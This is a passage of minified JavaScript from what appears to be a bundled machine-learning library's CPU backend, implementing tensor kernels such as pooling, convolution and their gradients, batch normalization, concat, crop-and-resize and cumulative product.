                    for (let C = 0; C < s.outWidth; ++C) {
                        const k = C * c - f;
                        let S = k;
                        for (; S < 0; )
                            S += u;
                        const T = Math.min(s.inWidth, h + k);
                        let R = Number.NEGATIVE_INFINITY
                          , L = -1;
                        for (let V = y; V < w; V += l) {
                            const F = V - I;
                            for (let X = S; X < T; X += u) {
                                const A = X - k
                                  , P = m.get(g, V, X, b);
                                P > R && (R = P,
                                L = o ? r ? ((g * s.inHeight + V) * s.inWidth + X) * s.inChannels + b : (V * s.inWidth + X) * s.inChannels + b : F * h + A)
                            }
                        }
                        i.set(L, g, x, C, b)
                    }
                }
        return i
    }
    function Yy(n, t, e, s, o, r) {
        const i = o.strideDepth
          , a = o.strideHeight
          , c = o.strideWidth
          , l = o.dilationDepth
          , u = o.dilationHeight
          , d = o.dilationWidth
          , h = o.effectiveFilterDepth
          , p = o.effectiveFilterHeight
          , f = o.effectiveFilterWidth
          , m = o.padInfo.front
          , g = o.padInfo.top
          , b = o.padInfo.left
          , x = "max" === r ? Number.NEGATIVE_INFINITY : Number.POSITIVE_INFINITY
          , I = wt(o.outShape, e)
          , y = I.values
          , w = o.outShape[1] * o.outShape[2] * o.outShape[3] * o.outShape[4]
          , C = o.outShape[2] * o.outShape[3] * o.outShape[4]
          , k = o.outShape[3] * o.outShape[4]
          , S = o.outShape[4];
        for (let T = 0; T < o.batchSize; ++T) {
            const R = T * w
              , L = T * s[0];
            for (let V = 0; V < o.inChannels; ++V)
                for (let F = 0; F < o.outDepth; ++F) {
                    const X = F * i - m;
                    let A = X;
                    for (; A < 0; )
                        A += l;
                    const P = Math.min(o.inDepth, h + X)
                      , B = R + F * C;
                    for (let K = 0; K < o.outHeight; ++K) {
                        const H = K * a - g;
                        let U = H;
                        for (; U < 0; )
                            U += u;
                        const Y = Math.min(o.inHeight, p + H)
                          , j = B + K * k;
                        for (let J = 0; J < o.outWidth; ++J) {
                            const nt = J * c - b;
                            let q = nt;
                            for (; q < 0; )
                                q += d;
                            const rt = Math.min(o.inWidth, f + nt)
                              , lt = j + J * S;
                            let ft = x
                              , ht = 0
                              , xt = 0;
                            for (let Dt = A; Dt < P; Dt += l) {
                                const Pt = L + Dt * s[1];
                                for (let jt = U; jt < Y; jt += u) {
                                    const Ot = Pt + jt * s[2];
                                    for (let Mt = q; Mt < rt; Mt += d) {
                                        const Ut = n[Ot + Mt * s[3] + V];
                                        if ("max" === r && Ut > ft ? ft = Ut : "avg" === r && (ht += Ut,
                                        xt++),
                                        isNaN(ft))
                                            break
                                    }
                                    if (isNaN(ft))
                                        break
                                }
                                if (isNaN(ft))
                                    break
                            }
                            y[lt + V] = "avg" === r ? ht / Math.max(xt, 1) : ft
                        }
                    }
                }
        }
        return I
    }
    const TE = {
        kernelName: Ca,
        backendName: "cpu",
        kernelFunc: function kE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t;
            it(o, "avgPool");
            const {filterSize: r, strides: i, pad: a, dimRoundingMode: c} = s;
            v(Te(i, 1), (()=>`Error in avgPool: Either strides or dilations must be 1. Got strides ${i} and dilations '1'`));
            const u = pn(o.shape, r, i, 1, a, c);
            let d;
            if (1 === u.filterWidth && 1 === u.filterHeight && Rt(u.inShape, u.outShape))
                d = Qn({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            else {
                const h = e.data.get(o.dataId).values
                  , p = ct(o.shape)
                  , f = mp(h, o.shape, o.dtype, p, u, "avg");
                d = e.makeTensorInfo(u.outShape, o.dtype, f.values)
            }
            return d
        }
    };
    const RE = {
        kernelName: va,
        backendName: "cpu",
        kernelFunc: function NE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {filterSize: r, strides: i, pad: a, dimRoundingMode: c, dataFormat: l} = s;
            it(o, "avgPool3d");
            const u = ss(o.shape, r, i, 1, a, c, l)
              , h = Yy(e.data.get(o.dataId).values, o.shape, o.dtype, ct(o.shape), u, "avg");
            return e.makeTensorInfo(h.shape, "float32", h.values)
        }
    };
    const GE = {
        kernelName: iu,
        backendName: "cpu",
        kernelFunc: function $E(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , {filterSize: i, strides: a, pad: c, dimRoundingMode: l} = s;
            it([o, r], "avgPool3DGrad");
            const u = ss(r.shape, i, a, 1, c, l)
              , d = u.strideDepth
              , h = u.strideHeight
              , p = u.strideWidth
              , f = u.filterDepth
              , m = u.filterHeight
              , g = u.filterWidth
              , b = u.dilationDepth
              , x = u.dilationHeight
              , I = u.dilationWidth
              , y = u.effectiveFilterDepth
              , w = u.effectiveFilterHeight
              , C = u.effectiveFilterWidth
              , k = y - 1 - u.padInfo.front
              , S = C - 1 - u.padInfo.left
              , T = w - 1 - u.padInfo.top
              , R = wt(r.shape, "float32")
              , L = 1 / (f * m * g)
              , V = e.bufferSync(o);
            for (let F = 0; F < u.batchSize; ++F)
                for (let X = 0; X < u.inChannels; ++X)
                    for (let A = 0; A < u.inDepth; ++A)
                        for (let P = 0; P < u.inHeight; ++P)
                            for (let B = 0; B < u.inWidth; ++B) {
                                const K = A - k
                                  , H = P - T
                                  , U = B - S;
                                let Y = 0;
                                for (let j = 0; j < y; j += b) {
                                    const J = (K + j) / d;
                                    if (!(J < 0 || J >= u.outDepth || Math.floor(J) !== J))
                                        for (let nt = 0; nt < w; nt += x) {
                                            const q = (H + nt) / h;
                                            if (!(q < 0 || q >= u.outHeight || Math.floor(q) !== q))
                                                for (let rt = 0; rt < C; rt += I) {
                                                    const lt = (U + rt) / p;
                                                    if (lt < 0 || lt >= u.outWidth || Math.floor(lt) !== lt)
                                                        continue;
                                                    Y += V.get(F, J, q, lt, X)
                                                }
                                        }
                                }
                                R.set(Y * L, F, A, P, B, X)
                            }
            return e.makeTensorInfo(R.shape, R.dtype, R.values)
        }
    };
    const EE = {
        kernelName: ru,
        backendName: "cpu",
        kernelFunc: function LE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , i = r;
            it([o, r], "avgPoolGrad");
            const {filterSize: a, strides: c, pad: l} = s
              , u = pn(i.shape, a, c, 1, l)
              , d = u.strideHeight
              , h = u.strideWidth
              , p = u.filterHeight
              , f = u.filterWidth
              , m = u.dilationHeight
              , g = u.dilationWidth
              , b = u.effectiveFilterHeight
              , x = u.effectiveFilterWidth
              , I = x - 1 - u.padInfo.left
              , y = b - 1 - u.padInfo.top
              , w = wt(i.shape, "float32")
              , C = 1 / (p * f)
              , k = e.data.get(o.dataId).values
              , S = wt(o.shape, "float32", k);
            for (let T = 0; T < u.batchSize; ++T)
                for (let R = 0; R < u.inChannels; ++R)
                    for (let L = 0; L < u.inHeight; ++L)
                        for (let V = 0; V < u.inWidth; ++V) {
                            const F = L - y
                              , X = V - I;
                            let A = 0;
                            for (let P = 0; P < b; P += m) {
                                const B = (F + P) / d;
                                if (!(B < 0 || B >= u.outHeight || Math.floor(B) !== B))
                                    for (let K = 0; K < x; K += g) {
                                        const H = (X + K) / h;
                                        if (H < 0 || H >= u.outWidth || Math.floor(H) !== H)
                                            continue;
                                        A += S.get(T, B, H, R)
                                    }
                            }
                            w.set(A * C, T, L, V, R)
                        }
            return e.makeTensorInfo(w.shape, w.dtype, w.values)
        }
    };
    const WE = {
        kernelName: Va,
        backendName: "cpu",
        kernelFunc: function DE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, scale: r, offset: i, mean: a, variance: c} = t;
            v(a.shape.length === c.shape.length, (()=>"Batch normalization gradient requires mean and variance to have equal ranks.")),
            v(null == i || a.shape.length === i.shape.length, (()=>"Batch normalization gradient requires mean and offset to have equal ranks.")),
            v(null == r || a.shape.length === r.shape.length, (()=>"Batch normalization gradient requires mean and scale to have equal ranks.")),
            it([o, a, c, r, i], "batchNorm");
            let {varianceEpsilon: l} = s;
            null == l && (l = .001);
            const u = e.data.get(o.dataId).values
              , d = e.data.get(a.dataId).values
              , h = e.data.get(c.dataId).values
              , p = r ? e.data.get(r.dataId).values : new Float32Array([1])
              , f = i ? e.data.get(i.dataId).values : new Float32Array([0])
              , m = new Float32Array(u.length)
              , g = f.length
              , b = p.length
              , x = h.length
              , I = d.length;
            let y = 0
              , w = 0
              , C = 0
              , k = 0;
            for (let S = 0; S < u.length; ++S)
                m[S] = f[y++] + (u[S] - d[w++]) * p[C++] / Math.sqrt(h[k++] + l),
                y >= g && (y = 0),
                w >= I && (w = 0),
                C >= b && (C = 0),
                k >= x && (k = 0);
            return e.makeTensorInfo(o.shape, o.dtype, m)
        }
    };
    const VE = {
        kernelName: ka,
        backendName: "cpu",
        kernelFunc: function ME(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockShape: r, crops: i} = s;
            it([o], "batchToSpaceND");
            const a = r.reduce(((b,x)=>b * x))
              , c = Mi(o.shape, r, a)
              , l = Vi(c.length, r.length)
              , u = Fi(o.shape, r, a)
              , d = ah(i, r.length)
              , h = ch(u, i, r.length)
              , p = At({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: c
                }
            })
              , f = Ke({
                inputs: {
                    x: p
                },
                backend: e,
                attrs: {
                    perm: l
                }
            })
              , m = At({
                inputs: {
                    x: f
                },
                backend: e,
                attrs: {
                    shape: u
                }
            })
              , g = wo({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    begin: d,
                    size: h
                }
            });
            return e.disposeIntermediateTensorInfo(p),
            e.disposeIntermediateTensorInfo(f),
            e.disposeIntermediateTensorInfo(m),
            g
        }
    };
    const zE = {
        kernelName: au,
        backendName: "cpu",
        kernelFunc: function FE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, weights: r} = t
              , {size: i} = s
              , l = up(e.data.get(o.dataId).values, e.data.get(r.dataId).values, r.dtype, r.shape, i);
            return e.makeTensorInfo([i], r.dtype, l)
        }
    };
    const AE = {
        kernelName: xf,
        backendName: "cpu",
        kernelFunc: function XE(n) {
            const {inputs: t, backend: e} = n
              , {s0: s, s1: o} = t
              , r = e.data.get(s.dataId).values
              , i = e.data.get(o.dataId).values
              , a = gt(Array.from(r), Array.from(i));
            return e.makeTensorInfo([a.length], "int32", Int32Array.from(a))
        }
    }
      , PE = Et(Er, ((n,t)=>{
        const e = t;
        return n > e.clipValueMax ? e.clipValueMax : n < e.clipValueMin ? e.clipValueMin : n
    }
    ))
      , OE = {
        kernelName: Er,
        backendName: "cpu",
        kernelFunc: PE
    }
      , KE = {
        kernelName: Ta,
        backendName: "cpu",
        kernelFunc: n=>{
            const {x: t} = n.inputs
              , e = n.backend
              , s = new Float32Array(Z(t.shape))
              , o = e.data.get(t.dataId)
              , r = o.complexTensorInfos.real
              , i = o.complexTensorInfos.imag
              , a = e.data.get(r.dataId).values
              , c = e.data.get(i.dataId).values;
            for (let l = 0; l < a.length; l++) {
                const u = a[l]
                  , d = c[l];
                s[l] = Math.hypot(u, d)
            }
            return e.makeOutput(s, t.shape, "float32")
        }
    };
    function ar(n) {
        const {inputs: t, backend: e} = n
          , {input: s} = t
          , o = e.data.get(s.dataId).complexTensorInfos.imag
          , r = e.data.get(o.dataId).values;
        return e.makeTensorInfo(o.shape, o.dtype, r)
    }
    const ZE = {
        kernelName: Nu,
        backendName: "cpu",
        kernelFunc: ar
    };
    function cr(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {axis: o} = s
          , r = It(o, t[0].shape)[0];
        oh(t.map((m=>m.shape)), r);
        let a = Kn(t.map((m=>m.shape)), r);
        if (0 === Z(a))
            return e.makeTensorInfo(a, t[0].dtype, []);
        const c = t.filter((m=>Z(m.shape) > 0));
        if (1 === c.length)
            return Qn({
                inputs: {
                    x: c[0]
                },
                backend: e
            });
        if ("complex64" === c[0].dtype) {
            const m = c.map((y=>yo({
                inputs: {
                    input: y
                },
                backend: e
            })))
              , g = c.map((y=>ar({
                inputs: {
                    input: y
                },
                backend: e
            })))
              , b = cr({
                inputs: m,
                backend: e,
                attrs: {
                    axis: r
                }
            })
              , x = cr({
                inputs: g,
                backend: e,
                attrs: {
                    axis: r
                }
            })
              , I = Qe({
                inputs: {
                    real: b,
                    imag: x
                },
                backend: e
            });
            return m.forEach((y=>e.disposeIntermediateTensorInfo(y))),
            g.forEach((y=>e.disposeIntermediateTensorInfo(y))),
            e.disposeIntermediateTensorInfo(b),
            e.disposeIntermediateTensorInfo(x),
            I
        }
        const l = c.map((m=>{
            const b = [-1, Z(m.shape.slice(r))];
            return At({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    shape: b
                }
            })
        }
        ))
          , u = l.map((m=>({
            vals: e.data.get(m.dataId).values,
            shape: m.shape
        })));
        a = Kn(l.map((m=>m.shape)), 1);
        const d = 1 === l[0].shape[0]
          , h = Qx(u, a, t[0].dtype, d)
          , p = Kn(c.map((m=>m.shape)), r)
          , f = e.makeTensorInfo(p, t[0].dtype, h);
        return l.forEach((m=>e.disposeIntermediateTensorInfo(m))),
        f
    }
    const BE = {
        kernelName: Na,
        backendName: "cpu",
        kernelFunc: cr
    };
    function Qy(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o, filter: r} = t
          , {strides: i, pad: a, dataFormat: c, dilations: l, dimRoundingMode: u} = s;
        it([o, r], "conv2d");
        const d = os(c)
          , h = ye(o.shape, r.shape, i, l, a, u, !1, d)
          , p = h.filterHeight
          , f = h.filterWidth
          , m = h.dilationHeight
          , g = h.dilationWidth
          , b = h.padInfo.left
          , x = h.padInfo.top
          , I = "channelsLast" === h.dataFormat
          , y = new xe(h.outShape,o.dtype)
          , w = ct(o.shape)
          , C = ct(r.shape)
          , k = w[0]
          , S = I ? w[1] : w[2]
          , T = I ? w[2] : 1
          , R = I ? 1 : w[1]
          , L = y.strides[0]
          , V = I ? y.strides[1] : y.strides[2]
          , F = I ? y.strides[2] : 1
          , X = I ? 1 : y.strides[1]
          , A = e.data.get(o.dataId).values
          , P = e.data.get(r.dataId).values
          , B = y.values;
        for (let K = 0; K < h.batchSize; ++K) {
            const H = K * k
              , U = K * L;
            for (let Y = 0; Y < h.outHeight; ++Y) {
                const j = U + Y * V
                  , J = Y * h.strideHeight - x;
                for (let nt = 0; nt < p; ++nt) {
                    const q = J + nt * m;
                    if (q < 0 || q >= h.inHeight)
                        continue;
                    const rt = nt * C[0]
                      , lt = H + q * S;
                    for (let ft = 0; ft < h.outWidth; ++ft) {
                        const ht = j + ft * F
                          , xt = ft * h.strideWidth - b;
                        for (let yt = 0; yt < f; ++yt) {
                            const Dt = xt + yt * g;
                            if (Dt < 0 || Dt >= h.inWidth)
                                continue;
                            const jt = lt + Dt * T;
                            let Ot = rt + yt * C[1];
                            for (let Mt = 0; Mt < h.inChannels; ++Mt) {
                                const Jt = A[jt + Mt * R];
                                for (let Ut = 0; Ut < h.outChannels; ++Ut)
                                    B[ht + Ut * X] += Jt * P[Ot + Ut];
                                Ot += h.outChannels
                            }
                        }
                    }
                }
            }
        }
        return e.makeTensorInfo(y.shape, y.dtype, B)
    }
    const HE = {
        kernelName: Ra,
        backendName: "cpu",
        kernelFunc: Qy
    };
    const UE = {
        kernelName: uu,
        backendName: "cpu",
        kernelFunc: function _E(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, pad: a, dataFormat: c, dimRoundingMode: l, filterShape: u} = s;
            it([o, r], "conv2dBackpropFilter");
            const d = os(c)
              , h = ye(o.shape, u, i, 1, a, l, !1, d)
              , {strideHeight: p, strideWidth: f, filterHeight: m, filterWidth: g} = h
              , b = "channelsLast" === h.dataFormat
              , x = new xe(h.filterShape,"float32")
              , I = h.padInfo.left
              , y = h.padInfo.top
              , w = e.data.get(o.dataId).values
              , C = e.data.get(r.dataId).values
              , k = new xe(o.shape,o.dtype,w)
              , S = new xe(r.shape,r.dtype,C);
            for (let T = 0; T < m; ++T) {
                const R = Math.max(0, Math.ceil((y - T) / p))
                  , L = Math.min(h.outHeight, (h.inHeight + y - T) / p);
                for (let V = 0; V < g; ++V) {
                    const F = Math.max(0, Math.ceil((I - V) / f))
                      , X = Math.min(h.outWidth, (h.inWidth + I - V) / f);
                    for (let A = 0; A < h.inChannels; ++A)
                        for (let P = 0; P < h.outChannels; ++P) {
                            let B = 0;
                            for (let K = 0; K < h.batchSize; ++K)
                                for (let H = R; H < L; ++H) {
                                    const U = T + H * p - y;
                                    for (let Y = F; Y < X; ++Y) {
                                        const j = V + Y * f - I;
                                        B += b ? k.get(K, U, j, A) * S.get(K, H, Y, P) : k.get(K, A, U, j) * S.get(K, P, H, Y)
                                    }
                                }
                            x.set(B, T, V, A, P)
                        }
                }
            }
            return e.makeTensorInfo(x.shape, x.dtype, x.values)
        }
    };
    const QE = {
        kernelName: $a,
        backendName: "cpu",
        kernelFunc: function YE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {inputShape: i, strides: a, pad: c, dataFormat: l, dimRoundingMode: u} = s;
            it([o, r], "conv2dBackpropInput");
            const d = ct(r.shape)
              , h = ct(o.shape);
            let p = os(l);
            const f = ye(i, r.shape, a, 1, c, u, !1, p)
              , m = new xe(f.inShape,"float32")
              , g = m.values
              , b = e.data.get(o.dataId).values
              , x = e.data.get(r.dataId).values
              , [I,y,w] = d
              , {batchSize: C, filterHeight: k, filterWidth: S, inChannels: T, inHeight: R, inWidth: L, outChannels: V, outHeight: F, outWidth: X, strideHeight: A, strideWidth: P} = f;
            p = f.dataFormat;
            const B = k - 1 - f.padInfo.top
              , K = S - 1 - f.padInfo.left
              , H = "channelsLast" === p
              , U = m.strides[0]
              , Y = H ? m.strides[1] : m.strides[2]
              , j = H ? m.strides[2] : 1
              , J = H ? 1 : m.strides[1]
              , nt = h[0]
              , q = H ? h[1] : h[2]
              , rt = H ? h[2] : 1
              , lt = H ? 1 : h[1];
            for (let ft = 0; ft < C; ++ft)
                for (let ht = 0; ht < T; ++ht)
                    for (let xt = 0; xt < R; ++xt) {
                        const yt = xt - B
                          , Dt = Math.max(0, Math.ceil(yt / A))
                          , Pt = Math.min(F, (k + yt) / A);
                        for (let jt = 0; jt < L; ++jt) {
                            const Ot = jt - K
                              , Mt = Math.max(0, Math.ceil(Ot / P))
                              , Jt = Math.min(X, (S + Ot) / P);
                            let Ut = 0;
                            for (let ve = Dt; ve < Pt; ++ve) {
                                const Xs = ve * A - yt;
                                for (let cn = Mt; cn < Jt; ++cn) {
                                    const Vn = nt * ft + q * ve + rt * cn
                                      , ps = I * (k - 1 - Xs) + y * (S - 1 - (cn * P - Ot)) + w * ht;
                                    for (let As = 0; As < V; ++As) {
                                        Ut += b[Vn + lt * As] * x[ps + As]
                                    }
                                }
                            }
                            g[U * ft + Y * xt + j * jt + J * ht] = Ut
                        }
                    }
            return e.makeTensorInfo(m.shape, m.dtype, m.values)
        }
    };
    const jE = {
        kernelName: Ga,
        backendName: "cpu",
        kernelFunc: function JE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r} = t
              , {strides: i, pad: a, dilations: c} = s;
            it([o, r], "conv3d");
            const l = ws(o.shape, r.shape, i, c, a)
              , {filterDepth: u, filterHeight: d, filterWidth: h, dilationDepth: p, dilationHeight: f, dilationWidth: m, padInfo: g} = l
              , b = g.front
              , x = g.left
              , I = g.top
              , y = new xe(l.outShape,o.dtype)
              , w = e.data.get(o.dataId).values
              , C = e.data.get(r.dataId).values
              , k = y.values
              , S = ct(o.shape)
              , T = ct(r.shape);
            for (let R = 0; R < l.batchSize; ++R) {
                const L = R * S[0]
                  , V = R * y.strides[0];
                for (let F = 0; F < l.outDepth; ++F) {
                    const X = V + F * y.strides[1]
                      , A = F * l.strideDepth - b;
                    for (let P = 0; P < u; ++P) {
                        const B = A + P * p;
                        if (B < 0 || B >= l.inDepth)
                            continue;
                        const K = P * T[0]
                          , H = L + B * S[1];
                        for (let U = 0; U < l.outHeight; ++U) {
                            const Y = X + U * y.strides[2]
                              , j = U * l.strideHeight - I;
                            for (let J = 0; J < d; ++J) {
                                const nt = j + J * f;
                                if (nt < 0 || nt >= l.inHeight)
                                    continue;
                                const q = K + J * T[1]
                                  , rt = H + nt * S[2];
                                for (let lt = 0; lt < l.outWidth; ++lt) {
                                    const ft = Y + lt * l.outChannels
                                      , ht = lt * l.strideWidth - x;
                                    for (let xt = 0; xt < h; ++xt) {
                                        const yt = ht + xt * m;
                                        if (yt < 0 || yt >= l.inWidth)
                                            continue;
                                        const Dt = q + xt * T[2]
                                          , Pt = rt + yt * l.inChannels;
                                        let jt = Dt;
                                        for (let Ot = 0; Ot < l.inChannels; ++Ot) {
                                            const Mt = w[Pt + Ot];
                                            for (let Jt = 0; Jt < l.outChannels; ++Jt)
                                                k[ft + Jt] += Mt * C[jt + Jt];
                                            jt += l.outChannels
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return e.makeTensorInfo(y.shape, y.dtype, y.values)
        }
    };
    const t3 = {
        kernelName: du,
        backendName: "cpu",
        kernelFunc: function qE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, pad: a, filterShape: c} = s;
            it([o, r], "conv3dBackpropFilterV2");
            const l = ct(o.shape)
              , u = ct(r.shape)
              , d = ws(o.shape, c, i, 1, a)
              , h = d.strideDepth
              , p = d.strideHeight
              , f = d.strideWidth
              , m = d.filterDepth
              , g = d.filterHeight
              , b = d.filterWidth
              , x = new xe(d.filterShape,"float32")
              , I = x.values
              , [y,w,C,k] = x.strides
              , S = e.data.get(r.dataId).values
              , [T,R,L,V] = u
              , F = e.data.get(o.dataId).values
              , [X,A,P,B] = l
              , K = d.padInfo.front
              , H = d.padInfo.left
              , U = d.padInfo.top;
            for (let Y = 0; Y < m; ++Y) {
                const j = Math.max(0, Math.ceil((K - Y) / h))
                  , J = Math.min(d.outDepth, (d.inDepth + K - Y) / h)
                  , nt = Y * y;
                for (let q = 0; q < g; ++q) {
                    const rt = Math.max(0, Math.ceil((U - q) / p))
                      , lt = Math.min(d.outHeight, (d.inHeight + U - q) / p)
                      , ft = q * w + nt;
                    for (let ht = 0; ht < b; ++ht) {
                        const xt = Math.max(0, Math.ceil((H - ht) / f))
                          , yt = Math.min(d.outWidth, (d.inWidth + H - ht) / f)
                          , Dt = ht * C + ft;
                        for (let Pt = 0; Pt < d.inChannels; ++Pt) {
                            const jt = Pt * k + Dt;
                            for (let Ot = 0; Ot < d.outChannels; ++Ot) {
                                let Mt = 0;
                                for (let Jt = 0; Jt < d.batchSize; ++Jt) {
                                    const Ut = Jt * X
                                      , hs = Jt * T;
                                    for (let ve = j; ve < J; ++ve) {
                                        const cn = (Y + ve * h - K) * A + Ut
                                          , Lo = ve * R + hs;
                                        for (let Vn = rt; Vn < lt; ++Vn) {
                                            const As = (q + Vn * p - U) * P + cn
                                              , Ps = Vn * L + Lo;
                                            for (let Os = xt; Os < yt; ++Os) {
                                                const cf = Os * V + Ps;
                                                Mt += F[(ht + Os * f - H) * B + As + Pt] * S[cf + Ot]
                                            }
                                        }
                                    }
                                }
                                I[jt + Ot] = Mt
                            }
                        }
                    }
                }
            }
            return e.makeTensorInfo(x.shape, x.dtype, x.values)
        }
    };
    const n3 = {
        kernelName: hu,
        backendName: "cpu",
        kernelFunc: function e3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {pad: i, strides: a, inputShape: c} = s;
            it([o], "conv3dBackpropInputV2");
            const l = ct(o.shape)
              , u = ct(r.shape)
              , d = ws(c, r.shape, a, 1, i)
              , h = new xe(d.inShape,"float32")
              , p = h.values
              , [f,m,g,b] = h.strides
              , x = e.data.get(o.dataId).values
              , [I,y,w,C] = l
              , k = e.data.get(r.dataId).values
              , [S,T,R,L] = u
              , {batchSize: V, filterDepth: F, filterHeight: X, filterWidth: A, inChannels: P, inDepth: B, inHeight: K, inWidth: H, outChannels: U, outDepth: Y, outHeight: j, outWidth: J, strideDepth: nt, strideHeight: q, strideWidth: rt} = d
              , lt = F - 1 - d.padInfo.front
              , ft = X - 1 - d.padInfo.top
              , ht = A - 1 - d.padInfo.left;
            for (let xt = 0; xt < V; ++xt)
                for (let yt = 0; yt < P; ++yt)
                    for (let Dt = 0; Dt < B; ++Dt) {
                        const Pt = Dt - lt
                          , jt = Math.max(0, Math.ceil(Pt / nt))
                          , Ot = Math.min(Y, (F + Pt) / nt);
                        for (let Mt = 0; Mt < K; ++Mt) {
                            const Jt = Mt - ft
                              , Ut = Math.max(0, Math.ceil(Jt / q))
                              , hs = Math.min(j, (X + Jt) / q);
                            for (let ve = 0; ve < H; ++ve) {
                                const Xs = ve - ht
                                  , cn = Math.max(0, Math.ceil(Xs / rt))
                                  , Lo = Math.min(J, (A + Xs) / rt);
                                let Vn = 0;
                                for (let ps = jt; ps < Ot; ++ps) {
                                    const As = ps * nt - Pt;
                                    for (let Ps = Ut; Ps < hs; ++Ps) {
                                        const Os = Ps * q - Jt;
                                        for (let ba = cn; ba < Lo; ++ba) {
                                            const cf = I * xt + y * ps + w * Ps + C * ba
                                              , B_ = S * (F - 1 - As) + T * (X - 1 - Os) + R * (A - 1 - (ba * rt - Xs)) + L * yt;
                                            for (let Kl = 0; Kl < U; ++Kl) {
                                                Vn += x[cf + Kl] * k[B_ + Kl]
                                            }
                                        }
                                    }
                                }
                                p[f * xt + m * Dt + g * Mt + b * ve + yt] = Vn
                            }
                        }
                    }
            return e.makeTensorInfo(h.shape, h.dtype, h.values)
        }
    }
      , s3 = Et(Dr, (n=>Math.cos(n)))
      , o3 = {
        kernelName: Dr,
        backendName: "cpu",
        kernelFunc: s3
    }
      , r3 = Et(Wr, (n=>Math.cosh(n)))
      , i3 = {
        kernelName: Wr,
        backendName: "cpu",
        kernelFunc: r3
    };
    const c3 = {
        kernelName: fu,
        backendName: "cpu",
        kernelFunc: function a3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {image: o, boxes: r, boxInd: i} = t
              , {cropSize: a, method: c, extrapolationValue: l} = s
              , [u,d,h,p] = o.shape
              , f = r.shape[0]
              , [m,g] = a
              , b = wt([f, m, g, p], "float32")
              , x = e.data.get(r.dataId).values
              , I = e.data.get(i.dataId).values
              , y = e.data.get(o.dataId).values
              , w = ct(o.shape)
              , C = ct(b.shape);
            for (let k = 0; k < f; k++) {
                const S = 4 * k
                  , T = x[S]
                  , R = x[S + 1]
                  , L = x[S + 2]
                  , V = x[S + 3]
                  , F = I[k];
                if (F >= u)
                    continue;
                const X = m > 1 ? (L - T) * (d - 1) / (m - 1) : 0
                  , A = g > 1 ? (V - R) * (h - 1) / (g - 1) : 0;
                for (let P = 0; P < m; P++) {
                    const B = m > 1 ? T * (d - 1) + P * X : .5 * (T + L) * (d - 1);
                    if (B < 0 || B > d - 1)
                        for (let K = 0; K < g; K++)
                            for (let H = 0; H < p; H++) {
                                const U = H + K * C[2] + P * C[1] + k * C[0];
                                b.values[U] = l
                            }
                    else if ("bilinear" === c) {
                        const K = Math.floor(B)
                          , H = Math.ceil(B)
                          , U = B - K;
                        for (let Y = 0; Y < g; Y++) {
                            const j = g > 1 ? R * (h - 1) + Y * A : .5 * (R + V) * (h - 1);
                            if (j < 0 || j > h - 1) {
                                for (let rt = 0; rt < p; rt++) {
                                    const lt = rt + Y * C[2] + P * C[1] + k * C[0];
                                    b.values[lt] = l
                                }
                                continue
                            }
                            const J = Math.floor(j)
                              , nt = Math.ceil(j)
                              , q = j - J;
                            for (let rt = 0; rt < p; rt++) {
                                let lt = rt + J * w[2] + K * w[1] + F * w[0];
                                const ft = y[lt];
                                lt = rt + nt * w[2] + K * w[1] + F * w[0];
                                const ht = y[lt];
                                lt = rt + J * w[2] + H * w[1] + F * w[0];
                                const xt = y[lt];
                                lt = rt + nt * w[2] + H * w[1] + F * w[0];
                                const Dt = ft + (ht - ft) * q
                                  , Pt = xt + (y[lt] - xt) * q;
                                lt = rt + Y * C[2] + P * C[1] + k * C[0],
                                b.values[lt] = Dt + (Pt - Dt) * U
                            }
                        }
                    } else
                        for (let K = 0; K < g; ++K) {
                            const H = g > 1 ? R * (h - 1) + K * A : .5 * (R + V) * (h - 1);
                            if (H < 0 || H > h - 1) {
                                for (let j = 0; j < p; j++) {
                                    const J = j + K * C[2] + P * C[1] + k * C[0];
                                    b.values[J] = l
                                }
                                continue
                            }
                            const U = Math.round(H)
                              , Y = Math.round(B);
                            for (let j = 0; j < p; j++) {
                                const J = j + U * w[2] + Y * w[1] + F * w[0]
                                  , nt = j + K * C[2] + P * C[1] + k * C[0];
                                b.values[nt] = y[J]
                            }
                        }
                }
            }
            return e.makeTensorInfo(b.shape, b.dtype, b.values)
        }
    };
    const u3 = {
        kernelName: pu,
        backendName: "cpu",
        kernelFunc: function l3(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, exclusive: i, reverse: a} = s;
            it(o, "cumprod");
            const c = Yt([r], o.shape.length);
            let l = o;
            null != c && (l = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: c
                }
            }));
            const u = ee(1, o.shape.length)[0];
            if (u !== l.shape.length - 1)
                throw new Error(`backend.cumprod in CPU expects an inner-most axis=${l.shape.length - 1} but got axis=${u}`);
            const d = _e(l.dtype, "int32")
              , h = jl(Z(l.shape), d)
              , p = e.data.get(l.dataId).values
              , f = l.shape[l.shape.length - 1]
              , m = a ? (b,x)=>b + f - x - 1 : (b,x)=>b + x;
            for (let b = 0; b < p.length; b += f)
                for (let x = 0; x < f; x++) {
                    const I = m(b, x);
                    if (0 === x)
                        h[I] = i ? 1 : p[I];
                    else {
                        const y = m(b, x - 1);
                        h[I] = i ? p[y] * h[y] : p[I] * h[y]
                    }
                }
